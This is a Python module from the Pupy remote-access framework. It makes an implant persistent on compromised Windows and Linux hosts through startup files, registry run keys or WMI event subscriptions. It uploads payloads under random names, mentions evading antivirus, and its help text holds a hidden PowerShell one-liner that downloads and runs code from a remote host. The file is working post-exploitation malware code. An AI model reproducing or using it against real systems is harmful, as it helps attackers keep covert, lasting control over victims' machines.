# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
import random
import pupygen
import os.path
import stat
import string

__class_name__="PersistenceModule"

@config(cat="manage", compat=['linux', 'windows'])
class PersistenceModule(PupyModule):
    """ Enables persistence via registry keys """

    dependencies = {
        'linux'     : [ 'persistence' ],
        'windows'   : [ 'pupwinutils.persistence', 'pupwinutils.security']
    }

    @classmethod
    def init_argparse(cls):
        example = 'Examples:\n'
        example += '>> run persistence -c "powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString(\'http://192.168.0.15:8080/eiloShaegae1\')\\\""\n'
        example += '>> run persistence -e \'/tmp/pupy.exe\' -m wmi\n'
        example += '>> run persistence -m wmi --remove\n'

        cls.arg_parser = PupyArgumentParser(prog="persistence", description=cls.__doc__, epilog=example)
        cls.arg_parser.add_argument('-e', '--exe', help='Use an alternative file and set persistency', completer=path_completer)
        cls.arg_parser.add_argument('-c', '--cmd', help='Use a command instead of a file')
        cls.arg_parser.add_argument('-s', '--shared', action='store_true', default=False,
                                         help='prefer shared object')
        cls.arg_parser.add_argument('--remove', action='store_true', help='try to remove persistency instead of enabling it')
        cls.arg_parser.add_argument('-m', '--method', choices=['startup', 'registry', 'wmi'], default=None, help='change the default persistency method. This argument is ignored on linux')

    def run(self, args):
        if self.client.is_windows():
            self.windows(args)
        else:
            self.linux(args)

    def linux(self, args):
        if args.remove:
            #TODO persistency removal
            self.error("not implemented for linux")
            return
        manager = self.client.conn.modules['persistence'].DropManager()
        self.success('Available methods: ' + ', '.join(
            method for method,state in manager.methods.iteritems() if state is True
        ))

        for method, result in manager.methods.iteritems():
            if result is not True:
                self.error('Unavailable method: {}: {}'.format(method, result))

        exebuff, tpl, _ = pupygen.generate_binary_from_template(
            self.client.get_conf(),
            self.client.desc['platform'],
            arch=self.client.arch,
            shared=args.shared
        )

        self.success("Generating the payload with the current config from {} - size={}".format(
            tpl, len(exebuff)))

        if args.shared:
            drop_path, conf_path = manager.add_library(exebuff)
        else:
            drop_path, conf_path = manager.add_binary(exebuff)

        if drop_path and conf_path:
            self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
        else:
            self.error('Couldn\'t make service persistent.')

    def windows(self, args):

        success = False
        method  = args.method
        isXP    = False

        windows_info = self.client.conn.modules["pupwinutils.security"].get_windows_version()
        if windows_info:
            if float(str('%s.%s' % (windows_info['major_version'], windows_info['minor_version']))) < 6.0:
                isXP = True

        # not admin or it is an XP (wmi use powershell so cannot be run on XP)
        if method == "wmi" and ((self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or isXP):
            self.warning("You seems to lack some privileges to remove wmi persistence ...")
            return

        # if no method specify, find one automatically depending on the system or the user privileges
        if not method:

            # for XP, use registry method
            if isXP:
                method = "registry"

            # not admin, use by default startup method
            elif self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
                method = "startup"

            else:
                method = "wmi"

        # -------------------------- removing persistency --------------------------
        if args.remove:
            self.info("Removing persistency using %s method..." % method)

            # from startup file
            if method == "startup":
                success = self.client.conn.modules['pupwinutils.persistence'].remove_startup_file_persistence()

            # from registry
            elif method == "registry":
                success = self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup()

            # from wmi event
            elif method == "wmi":
                success = self.client.conn.modules['pupwinutils.persistence'].remove_wmi_persistence()

            if success:
                self.success("Persistence removed !")
            else:
                self.error("Error removing persistence")

            return

        # -------------------------- adding persistency --------------------------

        if args.exe:
            if not os.path.exists(args.exe):
                self.error('Executable file not found: %s' % args.exe)
                return

            remotefile = self.client.conn.modules['os.path'].expandvars("%ProgramData%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
            self.info("Uploading to %s" % remotefile)
            upload(self.client.conn, args.exe, remotefile)
            cmd = remotefile

        elif args.cmd:
            cmd = args.cmd

        else:
            self.error("A command line or an executable is needed on windows (standard templates will get caught by the AV)")
            return

        self.info("Adding persistency using %s method..." % method)

        # creating a file into the startup directory
        if method == 'startup':
            if not args.exe:
                self.error("This method only works uploading an exe, cannot be run using a custom command :(")
                return
            success = self.client.conn.modules['pupwinutils.persistence'].startup_file_persistence(cmd)

        # adding persistency in registry (for xp, it will always be in registry)
        elif method == "registry":
            success = self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(cmd)

        # adding persistency using wmi event
        elif method == "wmi":
            success = self.client.conn.modules['pupwinutils.persistence'].wmi_persistence(command=cmd, file=remotefile)

        if success:
            self.success("Persistence added successfully !")
        else:
            self.error("An error occured creating the persistence, try to do it manually")
